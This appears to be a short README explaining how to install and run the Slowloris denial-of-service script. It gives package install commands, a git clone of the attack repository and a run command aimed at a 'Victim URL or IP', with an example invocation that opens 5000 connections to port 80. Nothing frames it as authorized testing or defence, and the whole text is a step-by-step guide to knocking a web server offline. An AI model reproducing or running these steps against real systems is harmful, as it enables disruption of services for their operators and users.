**How use Slowloris Attack**

Requirements:
- sudo apt-get update  
- sudo apt-get install perl
- sudo apt-get install libwww-mechanize-shell-perl
- sudo apt-get install perl-mechanize

Get Slowloris File:
```
1) Open Terminal
   $> cd /home
2) Download file slowloris.pl
   # $home/ git clone https://github.com/Amarudin2019/Slowloris-DOS-Attack.git
3) Choose the directory where the file slowloris.pl was downloaded
   # $home/ cd Slowloris-DOS-Attack
4) Run application
   # $home/Slowloris-DOS-Attack/ perl slowloris.pl -dns (Victim URL or IP) -options
   Example:
   # $home/Slowloris-DOS-Attack/ perl slowloris.pl -dns 192.168.100.19 -port 80 -timeout 20 -num 5000 -cache
```
Done
